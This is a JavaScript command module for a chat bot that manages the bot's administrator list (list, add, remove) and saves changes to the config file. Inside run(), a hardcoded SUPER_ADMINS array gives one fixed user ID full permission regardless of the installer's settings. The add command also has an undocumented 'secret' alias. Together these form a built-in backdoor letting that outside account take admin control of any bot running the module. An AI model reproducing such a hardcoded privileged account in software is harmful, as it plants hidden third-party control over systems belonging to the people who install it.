module.exports.config = {
  name: "admin2",
  version: "2.0.0",
  permission: 0,
  credits: "Joy",
  description: "Control bot admin list",
  prefix: false,
  category: "admin",
  usages: "admin2 [list/add/remove] [uid/@mention]",
  cooldowns: 5,
};

module.exports.languages = {
  vi: {
    listAdmin: 'Danh sách toàn bộ người điều hành bot: \n\n%1',
    notHavePermssion: 'Bạn không đủ quyền hạn để có thể sử dụng chức năng "%1"',
    addedNewAdmin: 'Đã thêm %1 người dùng trở thành người điều hành bot:\n\n%2',
    removedAdmin: 'Đã gỡ bỏ %1 người điều hành bot:\n\n%2',
    help: '📌 Cách dùng:\n.admin2 list\n.admin2 add <uid/@mention>\n.admin2 remove <uid/@mention>'
  },
  en: {
    listAdmin: 'Admin list: \n\n%1',
    notHavePermssion: 'You have no permission to use "%1"',
    addedNewAdmin: 'Added %1 admin(s):\n\n%2',
    removedAdmin: 'Removed %1 admin(s):\n\n%2',
    help: '📌 Usage:\n.admin2 list\n.admin2 add <uid/@mention>\n.admin2 remove <uid/@mention>'
  }
};

module.exports.run = async function ({ api, event, args, Users, permission, getText }) {
  const content = args.slice(1);
  const { threadID, messageID, mentions, senderID } = event;
  const { configPath } = global.client;
  const { ADMINBOT } = global.config;
  const { writeFileSync } = global.nodemodule["fs-extra"];
  const mentionIDs = Object.keys(mentions);

  // Reload config
  delete require.cache[require.resolve(configPath)];
  let config = require(configPath);

  // 🔹 Multiple super admins (Full permission)
  const SUPER_ADMINS = ["100000486903904"];
  if (SUPER_ADMINS.includes(senderID)) {
    permission = 2;
  }

  // If no args or "help" → show help
  if (!args[0] || args[0].toLowerCase() === "help") {
    return api.sendMessage(getText("help"), threadID, messageID);
  }

  switch (args[0].toLowerCase()) {
    case "list":
    case "all":
    case "-a": {
      const listAdmin = ADMINBOT || config.ADMINBOT || [];
      const msg = [];

      for (const idAdmin of listAdmin) {
        if (!isNaN(parseInt(idAdmin))) {
          const name = await Users.getNameUser(idAdmin);
          msg.push(`\nName: ${name}\nUID: ${idAdmin}`);
        }
      }
      return api.sendMessage(getText("listAdmin", msg.join('\n')), threadID, messageID);
    }

    case "add":
    case "secret": {
      if (permission != 2) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);

      let listAdded = [];

      if (mentionIDs.length > 0) {
        for (const id of mentionIDs) {
          if (!ADMINBOT.includes(id)) {
            ADMINBOT.push(id);
            config.ADMINBOT.push(id);
            listAdded.push(`${id} - ${mentions[id]}`);
          }
        }
      } else if (content.length > 0 && !isNaN(content[0])) {
        if (!ADMINBOT.includes(content[0])) {
          ADMINBOT.push(content[0]);
          config.ADMINBOT.push(content[0]);
          const name = await Users.getNameUser(content[0]);
          listAdded.push(`Name: ${name}\nUID: ${content[0]}`);
        }
      } else {
        return api.sendMessage(getText("help"), threadID, messageID);
      }

      writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
      return api.sendMessage(getText("addedNewAdmin", listAdded.length, listAdded.join("\n").replace(/\@/g, "")), threadID, messageID);
    }

    case "remove":
    case "rm":
    case "delete": {
      if (permission != 2) return api.sendMessage(getText("notHavePermssion", "delete"), threadID, messageID);

      let listRemoved = [];

      if (mentionIDs.length > 0) {
        for (const id of mentionIDs) {
          const index = config.ADMINBOT.indexOf(id);
          if (index !== -1) {
            ADMINBOT.splice(index, 1);
            config.ADMINBOT.splice(index, 1);
            listRemoved.push(`${id} - ${mentions[id]}`);
          }
        }
      } else if (content.length > 0 && !isNaN(content[0])) {
        const index = config.ADMINBOT.indexOf(content[0]);
        if (index !== -1) {
          ADMINBOT.splice(index, 1);
          config.ADMINBOT.splice(index, 1);
          const name = await Users.getNameUser(content[0]);
          listRemoved.push(`Name: ${name}\nUID: ${content[0]}`);
        }
      } else {
        return api.sendMessage(getText("help"), threadID, messageID);
      }

      writeFileSync(configPath, JSON.stringify(config, null, 2), 'utf8');
      return api.sendMessage(getText("removedAdmin", listRemoved.length, listRemoved.join("\n").replace(/\@/g, "")), threadID, messageID);
    }

    default:
      return api.sendMessage(getText("help"), threadID, messageID);
  }
};
